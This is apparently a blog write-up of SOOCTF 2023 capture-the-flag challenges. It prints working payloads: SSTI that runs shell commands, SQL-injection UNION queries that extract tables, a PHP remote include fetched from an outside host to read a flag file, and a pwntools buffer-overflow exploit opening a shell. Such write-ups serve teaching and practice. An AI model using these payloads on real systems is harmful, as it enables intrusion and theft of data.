      <p>Created by @dan1el</p> 
     </blockquote> 
     <p>This challenge presents us with a search box for searching a list of recipes (which I have a suspicion might be empty). The two main vulnerabilities that came to mind were <a href="https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/">SQLI (SQL injection)</a> and <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/">SSTI (server-side template injection)</a>. (If you know of a better resource on SSTI <a href="/contact">let me know</a>, I couldn’t find any great ones). I had a feeling that it might be SSTI because the search term gets reflected back into the UI, and there didn’t actually seem to be any recipes (hinting that the site probably wasn’t even searching a database).</p> 
     <h3 id="what-is-ssti">What is SSTI?</h3> 
     <p>SSTI (server-side template injection) is a vulnerability most commonly found in <a href="https://flask.palletsprojects.com/en/2.3.x/quickstart/">Flask</a> web applications. Flask has a templating feature which allows developers to use <a href="https://jinja.palletsprojects.com/en/3.1.x/">the Jinja templating language</a> to render webpages with dynamic data. Jinja supports evaluation of python-like expressions, and importantly, template rendering happens serverside. You definitely don’t want to render a user-controlled template, but developers sometimes do! That’s the cause of SSTI.</p> 
     <h3 id="testing-for-ssti">Testing for SSTI</h3> 
     <p>To test if the site was vulnerable to SSTI, I entered the classic payload <code>{{7*7}}</code>. The site outputted <code>No results found for: 49</code>, bingo! This confirms that the site is vulnerable to SSTI.</p> 
     <h3 id="exploitation">Exploitation</h3> 
     <p>To exploit the vulnerability, I simply searched Google for a Flask SSTI payload and found one that allowed me to run arbitrary shell commands.</p> 
     <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
</code></pre> 
     <p>Figure 1: <em>the payload.</em></p> 
     <p>After a bit of searching around, I found that the flag was located at <code>/home/flag.txt</code>.</p> 
     <p>Flag: <code>SOOCTF{j1nj@_55t1_1s_@_v3ry_c00l_t3chn1qu3}</code></p> 
     <h3 id="conclusion">Conclusion</h3> 
     <p>This was a nice introductory web challenge and emphasised the importance of not trusting user input.</p>

      <p>I learnt from my mistakes. I have also implemented a database backend and put some recipes in.</p> 
      <p>I wonder if your recipe is in there?</p> 
      <p>Created by @dan1el</p> 
     </blockquote> 
     <p>The site we’re presented with is very similar to that of <a href="#recipe-finder-web---7-solves">Recipe Finder</a>. Except this time if you enter an empty query, the site actually returns some recipes. Along with the word <code>Sequel</code> (as in SQL) in the title, and the mention of a database backend in the description, there’s a pretty good chance that this is an <a href="https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/">SQLI (SQL injection)</a> challenge.</p> 
     <h3 id="testing-for-sqli">Testing for SQLI</h3> 
     <p>Entering the classic SQLI payload <code>' OR '1'='1' -- </code> returns all of the recipes just as if we had entered an empty query. This is a great sign that we’ve probably got a working SQL injection.</p> 
     <h3 id="exploitation">Exploitation</h3> 
     <p>It is likely that the flag is stored in another table in the same database as the recipes table. To exfiltrate data we can use SQL’s <code>UNION</code> operator to append rows to the end of the results returned by the SQL query. For this to work we must make sure that the rows that we <code>UNION</code> onto the end of the results have the same column types and number of columns as the source data (it might work without doing so, but that depends more on the implementation of the backend).</p> 
     <p>The first thing we want to try is see if we can add a row to the results.</p> 
     <pre><code class="language-sql">' UNION SELECT 0, 'a', 's', 'd', 'f', 'g' -- 
</code></pre> 
     <p>Figure 2: <em>a simple union query with columns matching that of the recipes table.</em></p> 
     <p>After entering that query, we can see that we’ve added an extra row to the results table in the UI. Time to exfiltrate some useful data! The first information we want to get is a list of all tables in the database.</p> 
     <pre><code class="language-sql">' UNION SELECT 0, '', '', '', '', TABLE_NAME FROM information_schema.tables -- 
</code></pre> 
     <p>Figure 3: <em>a union query to extract the names of all tables in the database.</em></p> 
     <p>Scrolling through the output we can see that there’s a table called <code>flag</code> 👀 that sounds promising. Next, we need to list the columns of the table.</p> 
     <pre><code class="language-sql">' UNION SELECT 0, '', '', '', '', COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'flag' -- 
</code></pre> 
     <p>Figure 4: <em>a union query to extract the names of all columns in the <code>flag</code> table.</em></p> 
     <p>There appears to be a column called <code>flag</code>, at this point we can start getting excited.</p> 
     <pre><code class="language-sql">' UNION SELECT 0, '', '', '', '', flag FROM flag -- 
</code></pre> 
     <p>Figure 5: <em>a union query to extract the <code>flag</code> column from the <code>flag</code> table.</em></p> 
     <p>Woohoo! There’s the flag, right at the bottom of the table in the <code>Prep time</code> column, right where it belongs.</p> 
     <p>Flag: <code>SOOCTF{I_4m_@n_SQL_1nj3ct10n_3xp3rt}</code></p> 
     <h3 id="conclusion">Conclusion</h3> 
     <p>This was probably my favourite out of the web challenges. It forced me to refresh myself on how SQL injection data exfiltration works. I probably could’ve used <code>sqlmap</code>, but that takes out all the fun! It’s way more satisfying solving the challenge manually :)</p>

     </blockquote> 
     <p>This awesome challenge consisted of an index (with 3 links to the test page all targeting different test files) and a test page with a <em>PURE CSS</em> 3d spinning text effect (modified from <a href="https://codepen.io/savnac/pen/gOYMzvq">a nifty codepen example</a>).</p> 
     <p><img src="/image/sooctf-2023-style-points.jpg" alt="Screenshot of the Style Points website"> Figure 6: <em>the Style Points testing page with the <code>?file=files/test1.txt</code> parameter</em></p> 
     <h3 id="arbitrary-file-read">Arbitrary file read?</h3> 
     <p>My first instinct was just to try a few different files to see what we could access. <code>/etc/hostname</code>? <em>check</em>. <code>/etc/passwd</code>? <em>check</em>. And last but not least, drum roll please… <code>/flag.txt</code>? <em>check</em>, well… kind of?</p> 
     <p><img src="/image/sooctf-2023-style-points-partial-flag.jpg" alt="Screenshot of the partial flag we could read"> Figure 7: <em>the partial flag read using arbitrary file read</em></p> 
     <p>Unfortunately it seems like the flag is getting truncated. All we get is: <code>SOOCTF{pHp_1s_tRu1y_4n_1nt3r3st1ng_</code>. How annoying!</p> 
     <p>After this set back I messed around with the site for quite a while to no avail. One of my ideas was to <a href="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d">combine log poisoning with LFI</a>, but that wouldn’t have worked because the input file gets truncated to 35 characters. That’s when I gave it a break and moved on to some other challenges.</p> 
     <h3 id="finally-an-idea">Finally, an idea</h3> 
     <p>On the second day of the competition, I came back to the challenge with a fresh pair of eyes, and still didn’t come up with anything new. But eventually I remembered that PHP is stupid, and it often allows you to give it URLs in place of file paths; terrible for security, and great news for us!</p> 
     <p>The first payload I tried for this new idea was <code>?file=https://www.google.com</code>, just to see if anything would happen. And luckily, something did! I got a spinning <code> &lt;</code>. Weird, but still a good sign. My next thought was that the server is probably using some sort of <code>include</code> to display the contents of the file (after truncation), which would be stupid. But it would also mean that we can host a php payload on an HTTP server somewhere to get RCE. Weirdly, the URL only seemed to get read if it was HTTPS, so I hosted the payload on a development branch of my personal website as that was the fastest way I could think of.</p> 
     <pre><code class="language-php">&lt;?php readfile("/flag.txt"); ?&gt;
</code></pre> 
     <p>Figure 8: <em>the payload 🙏 (which importantly is shorter than the truncated flag)</em></p> 
     <p>With the payload hosted, all I had to do was visit <a href="http://chal.stateoforigin.online:3006/index.php?file=https://stackotter-git-sooctf-stackotter.vercel.app/test.php">http://chal.stateoforigin.online:3006/index.php?file=https://stackotter-git-sooctf-stackotter.vercel.app/test.php</a>, and voila, I got the flag in all its spinning glory!</p> 
     <p>Flag: <code>SOOCTF{pHp_1s_tRu1y_4n_1nt3r3st1ng_l4ngu4ge_b77b9324}</code></p> 
     <h3 id="improvements">Improvements</h3> 
     <p>Later on during the competition, I came up with a much nicer approach which I could’ve used. I wouldn’t have even had to host the payload! The idea came to me when I was reading about <a href="https://www.php.net/manual/en/wrappers.php">PHP’s supported protocols and wrappers</a>. The key being the <code>data://</code> wrapper. We can use a <code>base64</code> data URL to feed the server arbitrary data to output. For example, supplying <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code> gets the site to display <code>I love PHP</code> (it may be more accurate to say that I love <em>breaking</em> PHP).</p> 
     <h3 id="source-code">Source code</h3> 
     <p>The source code for the challenge hasn’t been released yet, but I extracted it using the same method I used to read the flag file out of interest. I haven’t reconstructed the code exactly, but the important parts are all there.</p> 
     <pre><code class="language-php">&lt;?php
ini_set('allow_url_fopen', false);
ini_set('allow_url_include', false);
stream_wrapper_unregister('http');
stream_wrapper_unregister('ftp');
stream_wrapper_unregister('zlib');
stream_wrapper_unregister('data');
stream_wrapper_unregister('glob');
stream_wrapper_unregister('phar');
stream_wrapper_unregister('rar');
stream_wrapper_unregister('ogg');
stream_wrapper_unregister('expect');

if (isset($_GET['file'])) {
    $text = substr(file_get_contents($_GET['file'], true),0,35);
    $file = fopen("files/1d788013b9c73e1dead5b9758b56b9dd.txt", "w");
    fwrite($file, $text);
    fclose($file);
    include("files/1d788013b9c73e1dead5b9758b56b9dd.txt");
} else {
    // ...
}
?&gt;
</code></pre> 
     <p>Figure 9: <em>the challenge’s source code.</em></p> 
     <p>The <code>stream_wrapper_unregister</code> function calls presumably aren’t working for whatever reason, because I can use <code>data://</code> URLs just fine.</p> 
     <h3 id="conclusion">Conclusion</h3> 
     <p>Overall the challenge was quite enjoyable. It was a good refresher for the various PHP exploitation techniques that I’ve forgotten over time.</p>

     <p>This pwn challenge was pretty easy; it was a simple 32-bit (ew) ret2win challenge.</p> 
     <h3 id="initial-recon">Initial recon</h3> 
     <p>When doing pwn challenges, it’s always a good idea to get an idea of what you’re going to be going up against. My favourite tool for doing so is <a href="https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec">checksec</a>. Its main purpose is to give you an idea of what protections a binary has in place.</p> 
     <pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre> 
     <p>Figure 10: <em>the output of <code>checksec hat-generator</code>.</em></p> 
     <p>In this case, the binary basically has no modern protections enabled (other than NX for protecting against shellcode attacks). Note that the binary is 32-bit (unlike most modern binaries), that’ll be important later when we’re writing an exploit script.</p> 
     <h3 id="decompilation">Decompilation</h3> 
     <p>If you haven’t used <a href="https://ghidra-sre.org">Ghidra</a> (a hacking tool developed by the NSA 😎), you should definitely give it a go! It’s free, and for CTFs it’s usually good enough to do the trick. In essence, its main feature is being able to turn compiled programs back into the C code that produced them as closely as possible.</p> 
     <pre><code class="language-c">void expertly_calculate_head_size(void) {
  char head_size[36];
  gets(head_size);
  return;
}

void main(void) {
  setup(&amp;stack0x00000004);
  print_intro();
  puts("");
  puts("Give us your head size and we\'ll generate a perfect hat!");
  printf("&gt;&gt;&gt; ");
  expertly_calculate_head_size();
  /* ... */
  return;
}

/* address: 0x80491b6 */
void Technology(void) {
  system("/bin/sh");
  return;
}
</code></pre> 
     <p>Figure 11: <em>the important parts of the decompiled binary.</em></p> 
     <h3 id="analysis">Analysis</h3> 
     <p>The code in Figure 11 showcases a pretty standard buffer overflow attack (about as easy to exploit as they get). Our goal is to take advantage of the program’s use of the insecure <a href="https://man7.org/linux/man-pages/man3/gets.3.html"><code>gets</code> function</a>.</p> 
     <blockquote> 
      <p>DESCRIPTION</p> 
      <p><em>Never use this function</em></p> 
     </blockquote> 
     <p>Figure 12: <em>excerpt from the <code>gets</code> manpage.</em></p> 
     <p>The issue with <code>gets</code> is that it doesn’t restrict how many characters a user can type in; it reads user input into the supplied buffer until a newline or EOF is encountered. This gives us as attackers a lot of power! We can overwrite any memory we want (as long as it’s after the input buffer), but it’s not pretty; we also have to overwrite everything between the input buffer and our target memory address. That’s good enough for us because we don’t care if the program crashes once we’re done with it, but it’s something to keep in mind if you’re ever trying a harder challenge! (see <a href="https://ctf101.org/binary-exploitation/stack-canaries/">Stack Canaries</a>)</p> 
     <p>Since we’re given a ‘win’ function (<code>Technology</code>), we just have to overwrite the return address of <code>expertly_calculate_hat_size</code> to <code>Technology</code>.</p> 
     <h3 id="exploitation">Exploitation</h3> 
     <p>The easiest way to write an exploit for a pwn challenge is to use <a href="http://docs.pwntools.com/en/stable/"><code>pwntools</code></a> - a Python package for developing exploits.</p> 
     <pre><code class="language-python">from pwn import *

p = remote("chal.stateoforigin.online", 3001)

p.sendline(b"a" * (36 + 8) + p32(0x080491b6))
p.interactive()
</code></pre> 
     <p>Figure 13: <em>the exploit.</em></p> 
     <p>Essentially, the exploit just writes 36 ‘a’s to the <code>head_size</code> buffer (to fill it up), 4 more ‘a’s to overwrite the hidden local variable inserted by the compiler because of <a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> (not important to understand), 4 more ‘a’s to overwrite the saved <code>ebp</code> pointer, and finally the desired return address to overwrite saved return address of <code>expertly_calculate_hat_size</code>. If you’re ever unsure how many bytes you’ll need to overwrite past the end of the buffer to get to the return address, don’t be scared to just try a bunch of different offsets! (on 32-bit it’ll usually be a multiple of 4, and on 64-bit a multiple of 8).</p> 
     <p>If you got a bit lost during that explanation check out the binary exploitation chapter of <a href="https://github.com/stackotter/the-ctf-book">my hands-on guide to CTF challenges</a>. Each section has 1 or 2 challenges to test out your skills as you learn them, ranging from easy to pretty difficult!</p>

     <p>Understanding this challenge does require at least a bit of knowledge about how the heap works, but I’ll do my best to explain as I go.</p> 
     <p>First, <code>init</code> loads the flag from <code>flag.txt</code> and pops it into a stack-allocated buffer before copying it into a heap-allocated buffer of size 1298 (<code>0x512</code>). I’m not sure why they did this in two steps. After loading the flag into the heap, they immediately <code>free</code> the heap-allocated buffer, but don’t clear the contents. This means that the heap will mark that flag’s memory as able to be used for allocating future buffer that the program wants to allocate, but the flag is still in the heap (until something overwrites it). This usually isn’t an issue, but it certainly is when the program also has an out-of-bound write vulnerability!</p> 
     <p>The main idea that we can use to attack this binary is to attempt to get the program to allocate a member’s name buffer in the spot that the <code>flag</code> was copied to (which is possible because the <code>flag</code> was <code>free</code>d allowing the memory to be reused). The usual way to do so is to try allocating a buffer with the same size as the flag’s buffer (1298 bytes). This works because allocations are organised into different ‘bins’ roughly based on allocation size. Lets give that approach a go.</p>

     <p>Figure 15: <em>trying out the attack idea.</em></p> 
     <p>Looks like it worked! The <code>name</code> buffer got given the memory that the flag was initially copied into, and we only overwrote the first two characters (with <code>a</code> and an invisible null byte) leaving the rest of the flag intact!</p> 
     <p>Interestingly, this approach even works if we set the length of the name to <code>1</code>. This is likely due to the specifics of the <code>malloc</code> implementation used by the binary’s libc version. Heap exploitation is quite unpredictable due to the many optimisations used by <code>malloc</code>, and the fact that <code>malloc</code> is always changing as the libc maintainers try to balance security with performance.</p> 
     <h3 id="conclusion">Conclusion</h3> 
     <p>A bit of a weird challenge due to the fact you could easily solve it just by using the program as a regular user. But the idea is certainly interesting and you can get quite a bit out of it if you really dive into the details and understand why it works.</p>

     <p>Starting with <code>main</code>, after poking around a bit it was clear that the only interesting function was <code>menu</code>. The program repeatedly lets the user perform calculations until they want to exit, in which case it calls <code>lore</code> before finally exiting (strange, remember that).</p> 
     <p>Each operation has its own function, so I searched through each of them for anything interesting, and the only interesting one was <code>pow</code>. If you enter a certain number it runs a command using <code>system</code>. From experience, I guessed that this was probably just done to make sure that <code>system</code> ended up in the binary’s <a href="https://ctf101.org/binary-exploitation/what-is-the-got/">global offset table</a> (not important to know about for this challenge, but very useful for more advanced rop challenges).</p> 
     <p>Next I took a look at <code>lore</code>, and saw that it was a pretty obvious buffer overflow opportunity. Altogether, that’s all we need to know to identify the challenge as a <code>ret2system</code> challenge and get pwning!</p>

     <p>Figure 18: <em>the exploit.</em></p> 
     <p>The specifics are detailed by the comments in the code, but on a high level the approach was to overflow the buffer, overwrite the saved return address with the known address of system, and then write a pointer to the string <code>sh</code> to the address 4 bytes past the end of the saved return address. To get a string containing <code>sh</code> we can simply append <code>sh</code> to out input to the <code>menu</code> function (it only checks the first character). This works because <code>menu</code> stores its input in a global variable (don’t ever do that please) which always has the same address every time the program gets run (remember, PIE is disabled). After running the exploit, we get an interactive shell and can look around for a flag. A quick <code>ls</code> reveals the <code>flag.txt</code> file in the current directory, which we can read using <code>cat flag.txt</code>.</p>

     <p>Figure 19: <em>the first few parts of the binary’s decompilation.</em></p> 
     <p>As you can see by comparing <code>func1</code> with my cleaned up version, a major skill in reverse engineering is being able to filter out all of the noise that makes functions look a lot more complicated than they are.</p> 
     <h3 id="analysis">Analysis</h3> 
     <p><code>main</code> is pretty simple, it’s basically what we’d expect after running the program. The user is prompted for 60 bytes of input, and the program then checks the input and writes it back to the user if it’s the flag, otherwise it tells them to keep going.</p> 
     <p><code>func1</code> is probably the most complicated of the checking functions, but it’s not actually performing any checks itself. It starts out by subtracting each character’s index from itself, before passing on the input to <code>func2</code> to be checked.</p> 
     <p><code>func2</code> then takes the input and performs two checks before passing the input on to <code>func3</code>:</p> 
     <ol> 
      <li><code>input[1] == input[2] + 1</code></li> 
      <li><code>input[1] == input[0] + 0x2a</code></li> 
     </ol> 
     <p>The next 35 <code>funcN</code>s follow a similar form to <code>func2</code>. They perform around 2 checks of their own and then parse the input to the next function. Importantly, <code>func2</code> and onwards all increment the input pointer by one before passing it to the next function. This means that the functions each progressively check later and later on in the input.</p> 
     <h3 id="discovering-angr">Discovering angr</h3> 
     <p>I considered for a second trying to write a solver for the logic, but quickly decided against that as it would be very tedious and likely wouldn’t work (I’ve never written that kind of solver before). My next thought to Google what <a href="https://angr.io"><code>angr</code></a> was because it sounded important. Somewhat unsurprisingly, it’s a tool that (among other things) can perform constrained bruteforce searches of an input space to find an input that succeeds. That sounds like something that could come in handy!</p> 
     <p>I had no clue how <code>angr</code> worked so at first I just tried a simple unconstrained bruteforce script hoping it was magic (spoiler, it wasn’t). I let the script run for quite a while and it didn’t seem to find anything (and also didn’t give any output post launch, which wasn’t very promising, although it turns out that that’s just what angr does). I eventually found an <a href="https://github.com/reversinghub/crackme-angr-elf/blob/master/src/angr_solver.py">example script</a> that set some constraints on the search space, so I took that and started trying to grasp what it was doing.</p>

     <p>Figure 20: <em>the example script that I found.</em></p> 
     <p>From my understanding, angr essentially has a mathematical constraints solver (which utilises symbolic execution) which can be used to vastly reduce the space of inputs that have to be searched. First the script constrains the flag to be exactly 10 characters (80 bits), and secondly it constrains all bytes to be between 48 and 57 inclusive (the range of digit characters in ASCII). Now it’s time to start applying this to the challenge at hand.</p>

     <p>Figure 22: <em>the constraint conversion script</em></p> 
     <p>After about another 30-40 minutes I had gotten a somewhat-functioning constraint conversion script up and running. Essentially, I copy pasted the source code of all 36 <code>funcN</code> (<code>N &gt; 1</code>) functions from Ghidra into the script as multiline string literals in a list. The code then iterates through all of the functions extracting the condition from the if statement and splitting it into its component expressions (by splitting on <code>&amp;&amp;</code>). The last expression (the one calling the next function) is discarded, and the other two undergo a bunch of string operations to make them look like Swift code. I had the most issues with sequences such as <code>\x14</code> which were getting interpreted by Python instead of included as escape sequences like they were in the C code. I ended up settling on just replacing the culprit character literals with their integer values (which is what was needed in the Python constraints anyway). I also needed to write a basic parser to parse out array indices and then subtract the function’s offset from the each index. That was necessary because each function in the c code increments the input pointer by one before calling the next function, so we need to adjust for that offset when converting the code. I also needed to subtract the index from the result of each array access to account for <code>func1</code> which does that exact operation.</p> 
     <p>After all of that work, my code was still somehow spitting out mismatched brackets, but I couldn’t figure out why so I just manually fixed the brackets on all 80 constraints.</p> 
     <p>It was time for the moment of truth. I ran the program, and… <code>unsat</code>? It turns out that the solver is smart enough to notice when constraints aren’t possible to satisfy (and <code>unsat</code> is short for unsatisfiable/unsatisfied). Looks like we’ve done something wrong.</p> 
     <p>Luckily, I already had a feeling this might happen, because I was unsure about my code for emulating <code>(char)x</code> in Python (where <code>x</code> is a signed integer). The easiest solution was to just comment out all of the constraints that I was unsure about, so that’s what I did. This time the script didn’t exit immediately so I continued attempting other challenges while I waited for it to finish its search. Keep in mind that I’m running the script in an x86_64 Linux VM under QEMU on my ARM Mac, so angr was probably running a bit slower than it usually would.</p>

     <p>Figure 23: <em>my worst nightmare.</em></p> 
     <p>The script finished after around 30 minutes and found a successful input! But it crashed trying to print out the result 🤦‍♂️. I updated the script and again it crashed after finding a result. But eventually, on the third attempt, the script successfully found the flag!</p>

     <p>Finally!! That was definitely the most exciting moment of the whole CTF for me, first blood on one of the challenges that had lasted until the last afternoon 😎</p>

     <h3 id="conclusion">Conclusion</h3> 
     <p>I still have no idea whether that was the correct approach or not, but I’m super pleased that I managed to complete the challenge without any prior experience with or knowledge of angr! Definitely my favourite challenge of the entire CTF. I’ve said it before and I’ll say it again: It almost made up for there not being any hard pwn challenges (<em>almost</em>).</p>
